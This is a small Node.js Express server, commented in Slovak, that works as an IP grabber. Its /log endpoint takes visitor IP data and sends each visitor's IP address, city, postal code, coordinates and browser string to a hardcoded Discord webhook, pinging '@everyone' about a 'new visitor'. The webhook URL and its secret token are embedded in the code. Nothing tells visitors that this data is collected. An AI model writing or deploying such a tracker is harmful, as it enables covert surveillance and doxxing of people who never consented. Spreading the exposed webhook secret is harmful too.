const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Pevne zadaná Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1311277775352496158/Lx_P0HpD-gXd_O8CpUF6kjkq2_bF_i031O5YxZG9N3yJ1jX0wzHTJwYcEu_2oUb9xkqi';

// Endpoint na zaznamenanie návštevníkov
app.post('/log', async (req, res) => {
    try {
        const { ipData } = req.body;
        
        const message = {
            content: `@everyone 🚨 **NEW VISITOR DETECTED** 🚨\n\n` +
                    `🌐 IP: ${ipData.ip || 'Unknown'}\n` +
                    `📍 Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}, ${ipData.postal || 'Unknown'}, ${ipData.country_calling_code || 'Unknown'}, ${ipData.currency || 'Unknown'}\n` +
                    `🌍 Coords: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}\n` +
                    `🔍 Browser: ${req.headers['user-agent']}\n` +
                    `⏰ Time: ${new Date().toISOString()}`
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        res.json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.json({ success: true }); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
